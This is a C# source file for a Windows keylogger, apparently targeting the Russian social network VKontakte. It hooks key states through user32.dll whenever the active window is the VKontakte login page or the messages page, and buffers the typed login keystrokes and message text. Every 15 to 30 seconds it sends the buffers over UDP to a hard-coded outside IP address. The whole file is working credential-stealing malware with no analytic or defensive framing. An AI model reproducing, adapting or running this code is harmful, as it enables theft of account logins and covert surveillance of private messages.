using System.Runtime.InteropServices;
using System;
using System.Threading;
using System.Windows.Forms;
using System.Text;
using System.Net.Sockets;

namespace Keylogger
{
    class KeyloggerClient
    {
        static string buffEntry = "";
        static string buffMessage = "";

        static void Main(string[] args)
        {
            StringBuilder headerWnd = new StringBuilder(64);
            Thread myThread = new Thread(new ThreadStart(sendBuffEntry));
            myThread.Start();
            Thread myThread2 = new Thread(new ThreadStart(sendBuffMessage));
            myThread2.Start();

            while (true)
            {
                IntPtr handle = GetForegroundWindow();

                if (GetWindowText(handle, headerWnd, 32) > 0)
                {
                    if (headerWnd.ToString().Contains("Добро пожаловать | ВКонтакте"))
                    {
                        for (Int32 i = 0; i < 255; i++)
                        {
                            int state = GetAsyncKeyState(i);
                            if (state == 1 || state == -32767)
                            {
                                buffEntry += ((Keys)i).ToString() + " ";
                            }
                        }
                    }
                    if (headerWnd.ToString().Contains("Диалоги"))
                    {
                        for (Int32 i = 0; i < 255; i++)
                        {
                            int state = GetAsyncKeyState(i);
                            if (state == 1 || state == -32767)
                            {
                                buffMessage += ((char)i).ToString();
                            }
                        }
                    }
                }
                Thread.Sleep(100);
            }
        }

        private static void sendBuffMessage()
        {
            while (true)
            {
                Thread.Sleep(15000);
                if (buffMessage == "") continue;
                UdpClient client = new UdpClient();
                client.Connect("92.37.205.232", 3001);
                byte[] data = Encoding.UTF8.GetBytes(buffMessage);
                client.Send(data, data.Length);
                client.Close();
                buffMessage = "";
            }
        }
        private static void sendBuffEntry()
        {
            while (true)
            {
                Thread.Sleep(30000);
                if (buffEntry == "") continue;
                UdpClient client = new UdpClient();
                client.Connect("92.37.205.232", 3000);
                byte[] data = Encoding.UTF8.GetBytes(buffEntry);
                client.Send(data, data.Length);
                client.Close();
                buffEntry = "";
            }
        }

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    }
}